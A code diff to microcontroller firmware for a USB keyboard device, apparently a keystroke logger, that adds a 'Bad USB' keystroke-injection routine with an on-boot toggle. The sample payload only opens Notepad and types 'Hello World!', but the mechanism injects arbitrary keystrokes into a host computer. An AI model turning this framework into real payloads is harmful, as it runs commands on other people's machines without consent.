@@ -3,7 +3,6 @@
 #include "pio_usb.h"
 #include "Adafruit_TinyUSB.h"
 
-
 // ======================================= Define and Variables =============================================
 
 #define HOST_PIN_DP   19
@@ -37,6 +36,64 @@ uint8_t bufferIndex = 0;
 unsigned long lastKeyTime = 0;
 
 uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };
+
+
+// ====================================== Bad USB ===============================================
+
+
+void payload() {
+  // Example Payload - modify this as needed.
+  delay(2000);
+  // key press
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  // keys release (for multi keypresses)
+  Keyboard.releaseAll();
+  delay(1500);
+  // print string
+  Keyboard.print("notepad");
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(3000);
+  // print string + return
+  Keyboard.println("Hello World!");
+}
+
+
+bool getPayloadRunState() {
+    File file = LittleFS.open("/payload_state.txt", "r");
+    if (!file) {
+        Serial.println("No saved payload state found. Defaulting to OFF.");
+        return false; 
+    }
+    String state = file.readString();
+    file.close();
+    state.trim();
+    return (state == "ON");
+}
+
+void savePayloadRunState(bool state) {
+    File file = LittleFS.open("/payload_state.txt", "w");
+    if (file) {
+        file.println(state ? "ON" : "OFF");
+        file.close();
+    } else {
+        Serial.println("Failed to save payload run state.");
+    }
+}
+
+void payloadOnBootON() {
+    savePayloadRunState(true);
+    Serial.println("Payload will run on boot.");
+}
+
+void payloadOnBootOFF() {
+    savePayloadRunState(false);
+    Serial.println("Payload will NOT run on boot.");
+}
 
 
 // ======================================= Buffer Functions =============================================
@@ -87,6 +144,14 @@ void setup() {
   LittleFS.begin();
   Keyboard.begin();
   delay(1000);
+  
+    if (getPayloadRunState()) {
+        Serial.println("Running payload...");
+        payload();
+    } else {
+        Serial.println("Payload is disabled on boot.");
+    }
+  
 }
 
 void loop() { 
@@ -99,6 +164,10 @@ void loop() {
       clearLogFile();
     } else if (command == "format") {
       formatFS();
+    } else if (command == "pobenabled") {
+      payloadOnBootON();
+    } else if (command == "pobdisabled") {
+      payloadOnBootOFF();
     }
   }
   checkInactivity();
